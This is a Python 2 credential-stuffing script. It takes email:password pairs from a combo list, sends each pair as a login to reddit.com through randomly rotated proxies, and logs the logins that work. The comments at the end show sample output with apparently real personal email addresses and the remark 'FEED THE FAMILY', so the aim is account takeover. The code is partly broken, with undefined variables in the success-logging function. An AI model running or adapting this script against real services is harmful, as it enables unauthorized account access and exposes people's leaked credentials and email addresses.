# sam_the_man.py
# future revision notes - add duplicate checker and cleaner (won't be good
# if you are trying to execute username:password, (aka mess up the order))

import urllib
import urllib2
import os
import random
import socket

# global vars
combo_list = "combo.txt"
proxy_list = "proxies.txt"
data = []
emails = []
passwords = []
parsed_passwords = []
proxies = []


def split():
    for x in data:
        y = x.split(":")
        passwords.append(y[1:4])
        emails.append(y[0])


def combine():
    for passes in passwords:  # iterates through each tuple
        for item in passes:  # iterates through each tuple items
            parsed_passwords.append(item)


def fucking_crack():
    url = 'http://reddit.com'
    headers = { "Content-Type" : "application/x-www-form-urlencoded", "Content-Language" : "en-US"   } #generate random user-agent per user
    currentproxy = ""
    for d, e in zip(emails, parsed_passwords):
        currproxy = switch_proxy(currentproxy)
        payload = {'username': d,
                        'password': e,
                        'ref': 'dashboard.php',
                        'submit': ': undefined'}
        proxy = urllib2.ProxyHandler({'http': currproxy})
        opener = urllib2.build_opener(proxy)
        data = urllib.urlencode(payload)
        req = urllib2.Request(url, data, headers)
        response = opener.open(req)
        accountstatus = response.read()
        valid(accountstatus, d, e)
        print currproxy

def switch_proxy(currentproxy):
    currentproxy = proxies[random.randint(0, len(proxies)-1)]
    return currentproxy
        
def valid(a,b,c):
        if '<h1>Sign In</h1>' not in a:
            f = open(success, 'w')
            f.write(d + ":" + e + "\n")  
            f.close()
            print '[+][+]' + a + ' successful login. Details logged in ' + success + "."
        else:
            print '[-][-]' + b + ' invalid account...'
        return a
# check if combolist/proxyfile exists + append to array
if os.path.exists(combo_list):
    combo_reader = open(combo_list, 'r')
    for combo in combo_reader.readlines():
        if combo != "":
            data.append(combo.strip())
        combo_reader.close()

else:
    print '[-][-] Combo lists not found... quitting.'
    quit()

if os.path.exists(proxy_list):
    proxy_reader = open(proxy_list, 'r')
    for proxy in proxy_reader.readlines():
        if proxy != "":
            proxies.append(proxy.strip())
        proxy_reader.close()
    # http_proxies = ['http://' + x for x in proxies]
else:
    print '[-][-] Proxy list not found... quitting.'
    quit()

split()
combine()
fucking_crack()
# data gets parsed and sorted
# next start cracking!!!!!

# [-][-] invalid account...
#192.168.1.131:8080
#[-][-]schoeberlein@freenet.de invalid account...
#192.168.1.131:8080
#[-][-]robitobbi@gmx.net invalid account...
#192.168.1.131:8080
#[-][-]stephanielouise17@gmail.com invalid account...
##c[-][-]dolphingirllollolrofl@gmail.com invalid account...
#192.168.1.131:8080


#IT USES PROXY, NOW WE JUST ADD A METHOD TO ROTATE THE PROXIES!!! FEED THE FAMILY


